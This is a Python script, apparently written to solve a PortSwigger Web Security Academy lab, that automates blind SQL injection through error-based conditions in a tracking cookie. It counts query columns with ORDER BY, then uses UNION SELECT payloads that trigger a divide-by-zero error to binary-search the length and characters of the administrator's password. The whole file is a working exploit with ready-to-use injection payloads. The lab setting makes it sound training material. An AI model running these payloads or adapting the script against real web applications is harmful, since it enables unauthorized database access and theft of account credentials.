#!/usr/bin/python3

# by caglaroflazoglu
# Blind-SQL script for Portswigger examples (lab-conditional-errors)
# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

import requests
import math


def engine(params="", show=False):
    try:
        URL = "https://XXXXXXXXXXXXXXXXXXXXX.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories"  # change this

        PARAMS = {"TrackingId": "AAAAAAAAAAAAAAAA" + params,
                  "session": "XXXXXXXXXXXXXXXXXXXXXXXXXXXX"  # change this
                  }

        r = requests.get(url=URL, cookies=PARAMS)

        if show:
            print(PARAMS)
            # print(r.content)

        l = len(str(r.content))

        return [r.status_code, l]

    except Exception as ex:
        if show:
            print(ex)
        pass

    return [999, 0]


def enumerate(payload, length, ranges, codes, opt='num', debug=False):
    output = ""
    for i in range(1, length+1, 1):
        wrkrange = ranges.copy()
        while True:
            tcase = math.floor((wrkrange[0]+wrkrange[1])/2)

            if opt == 'pass':
                if tcase == ord(';'):  # unacceptable char
                    tcase += 1
                p1 = chr(tcase)
            else:
                p1 = str(tcase)

            payloadnew = payload.format(p1, i)
            resp = engine(payloadnew, debug)
            print("[?:"+str(resp[0])+"]"+output+"["+p1+"]")

            if resp[0] in codes:
                if tcase == wrkrange[0]:
                    output += p1
                    break
                wrkrange[0] = tcase
            else:
                wrkrange[1] = tcase
    return output



default = engine()

if default[0] != 200:
    if default[1] < 1:
        print("Connection problem!")
    else:
        print("Session expired! Change your session id!")
    exit()

#defaultlen = default[1]

payload = "' order by {} -- "

outputsize = enumerate(payload, 1, [1, 20], [200], 'num')
print("[+] default query output count:"+outputsize)


payload = "' union select CASE WHEN length(password)>= {} THEN (CAST((1/0) AS CHAR(4))) ELSE NULL END from users where username='administrator' -- "

passlen = enumerate(payload, 1, [1, 100], [500], 'num')

print("[+] password length:"+passlen)

passlen = int(passlen)

payload = "' union select CASE WHEN substr(password,{1},1)>='{0}' THEN (CAST((1/0) AS CHAR(4))) ELSE NULL END from users where username='administrator' -- "

password = enumerate(payload, passlen, [ord("0"), ord("z")+1], [500], 'pass')

print("[!] password:\t"+password)
